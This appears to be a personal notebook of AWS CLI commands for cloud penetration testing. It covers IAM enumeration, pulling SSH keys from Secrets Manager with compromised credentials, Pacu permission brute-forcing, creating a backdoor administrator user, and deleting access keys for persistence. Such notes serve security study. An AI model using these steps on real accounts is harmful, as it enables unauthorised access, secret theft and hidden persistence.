    AWS (Amazon Web Services)

    A cloud computing service provided by Amazon that offers a wide range of services including compute, storage, database, and networking capabilities. It allows users to access and manage these resources over the internet.

    Basics

      Service Description
      EC2 Elastic Compute Cloud - provides resizable compute capacity in the cloud
      S3 Simple Storage Service - provides secure, durable, and highly available object storage
      IAM Identity and Access Management - provides secure control over AWS resources

    Usage of AWS CLI

      Defining profiles

        AWS cli works using profiles and credentials stored in the ~/.aws/credentials file.

        You can define a profile by using the following command which will prompt you to enter your credentials:

        aws configure --profile amethyst-admin

        Then check if you done it correctly. Using the following command also provides you with the username of the account

        aws sts get-caller-identity --profile amethyst-admin
        Warning: Have in mind that this actions are logged

      Accessing the Web AWS Console

        In case you would like to acces the management console here you'll have to do some things

        First identify the ID of the account. To do so type the access key id and secret access key just like previously and using the following command show the info about the user

        aws sts get-caller-identity --profile amethyst-admin

        Then check if there are already a set of credentials for that username

        aws iam get-login-profile --user-name admin-mason --profile amethyst-admin

        If it isn't the case just create them

        aws iam create-login-profile --user-name admin-mason --password 'TuPasswordTemporal123!' --no-password-reset-required --profile amethyst-admin

        Finally access the console using the website

    Listing secrets

      Once you have aws credentials and a defined profile you can list secrets and check if there are credentials to potential EC2 instances

      aws secretsmanager list-secrets

      Then list the value of a secret

      aws secretsmanager get-secret-value --secret-id bastion-ssh-access-key-20260915054054 --profile compromised

      Then you can filter the reseult by using query and decoding the result. Just like this

      aws secretsmanager get-secret-value --secret-id bastion-ssh-access-key-20260915054054 --profile compromised --query "SecretString" --output text | base64 -d

      SSH keys situations

        In case you find SSH keys i recommend you to check for the name of the secrets and then list ec2 instances to find a instance where you can use the key

        aws ec2  describe-instances --filter Name=instance-state-name,Values=running --profile compromised --query 'Reservations[].Instances[].{Tags: Tags,PublicName: PublicDnsName,PublicIP:PublicIpAddress}'

        I recommend you to check for the ami name in the AWS marketplace AWS Marketplace in order to find a possible username for the key. You can always use ssh-keygen -lf awskey to check the comments

        For amazon linux default user is ec2-user

    IAM

      Basic listing

        aws --profile target iam list-users   #Listing users 
aws --profile target iam list-groups  #Listing groups
aws --profile target iam list-roles   #Listing roles
aws --profile target iam list-policies --scope Local --only-attached 
aws --profile target iam get-account-authorization-details  #Get all information about IAM users (May not work based on permissions but in case it works you may be able to obtain informatin that by other methods you couldn't)

      Automate process

        Pacu tool let us automate the process of enumerating IAM permissions. Just open it, list modules and check for [Category: ENUM]

      Listing policies

        We can attempt to list policies associated with the user or role. Use the following command. If it does not appear any error means that we have the permission iam:ListAttachedUserPolicies action

        aws --profile target iam list-user-policies --user-name clouddesk-plove

      Listing groups and policies based on a user

        In case any group is listed we can deduce that some policies may be inherited since the user belongs to that group

        aws --profile target iam list-groups-for-user --user-name clouddesk-plove

        If we find any group we can check the policies associated with it. There are two types of policies: managed policies and inline policies.

        Managed Policies

          AWS managed policies are designed to provide permissions for many common use cases. They make it easier for you to get started with assigning permissions to users, groups, and roles than if you had to write the policies yourself.

          aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
          these policies often grant broader permissions than might be desired. Ideally, they should be paired with other more-restrictive policies to ensure fine-grained permission control.

        Inline Policies

          Inline policies are embedded directly within the user, group, or role and belong exclusively to that principal.

          aws --profile target iam list-user-policies --user-name clouddesk-plove

        Now we can check the version of that policy:

        aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"

        And finally inspect the policy details:

        aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8

        Finally, in case you don't have the privileges to query IAM-related information we can use the module iam__bruteforce_permissions from pacu to identify actions we could perform

      Gather additional information

        We can use the following command to gather account summary information:

        aws --profile target iam get-account-summary | tee account-summary.json

        An important thing to note is the parameter "AccountMFAEnabled": 0 which indicates that Multi-Factor Authentication is not enabled for the account.

      Exploitation

        Checking for credentials

          In case you found a way to obtain a reverse shell inside the compromised AWS envioronment you must check environmental variables since credentials for the AWS account you are impersonating will be there

        Creating a Backdoor

          The best way of maintaning access is through a backdoor. In AWS a backdoor could be the creation of an administrator account. Create an admin account by using

          aws --profile CompromisedJenkins iam create-user --user-name backdoor

          Now attach it to the administrators group:

          aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

          Create credentials (Access key and Secret key):

          aws --profile CompromisedJenkins iam create-access-key --user-name backdoor

    Privilege escalation

      Just in case you achieved a shell access inside a compromised ec2 instance you should attempt to escalate your privileges comonly as another unix system eventhough there are some thing you can check specifically for aws environments

      First check if you are root or can use sudo

      sudo -l

      Now check if you can run AWS cli commands

      aws sts get-caller-identity

      Now list AWS users

      aws iam list-users

      Identify a user with administrative privileges (commonly for the name) and create access keys for persistence

      aws iam create-access-key --user admin-mason

      Note that access keys and access the AWS environment from your local machine

    Persistence

      With an administrative account the use the following commands to create persistent access:

      Create a user

      aws iam create-user --user-name cicd --profile admin-mason

      Add administrator permissions to it

      aws iam attach-user-policy --user-name cicd --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile admin-mason

      Delete access keys for the previus user you have been using

      aws iam delete-access-key --user-name admin-mason --access-key-id AKIARLO3TVYSG6LN3GFT --profile admin-mason
